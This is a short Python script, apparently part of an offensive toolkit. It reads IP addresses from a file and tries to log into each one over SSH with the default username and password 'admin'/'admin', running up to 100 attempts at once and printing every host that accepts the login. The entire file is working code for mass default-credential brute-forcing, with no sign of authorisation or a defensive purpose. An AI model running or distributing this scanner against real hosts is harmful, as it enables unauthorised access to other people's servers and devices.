#!/usr/bin/env python3

import asyncio
import argparse
import asyncssh
from termcolor import colored
from ..utils import ConnectionFailed, ips_from_file
from ..parallel import progressbar_execute


async def ssh_brute(ip: str, port: int, username: str, password: str):
    common_opts = {
        "known_hosts": None,
        "preferred_auth": ["keyboard-interactive", "password"],
        "kex_algs": "*",
        "encryption_algs": "*",
        "mac_algs": "*",
    }
    brute_opts = {
        "host": ip,
        "port": port,
        "username": username,
        "password": password,
        "connect_timeout": 2,
        "login_timeout": 10,
    }
    async with asyncssh.connect(**(common_opts | brute_opts)):
        return f"{ip}"


async def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("infile", type=argparse.FileType("r"))
    args = parser.parse_args()
    coros = [ssh_brute(ip, 22, "admin", "admin") for ip in ips_from_file(args.infile)]
    async for fut in progressbar_execute(coros, 100):
        try:
            res = fut.result()
            print(res)
        except ConnectionFailed:
            pass
        except ConnectionResetError:
            pass
        except asyncssh.PermissionDenied:
            pass
        except asyncssh.ConnectionLost:
            pass
        except TimeoutError:
            pass
        except Exception as e:
            print(colored(repr(e), "red"))


asyncio.run(main())
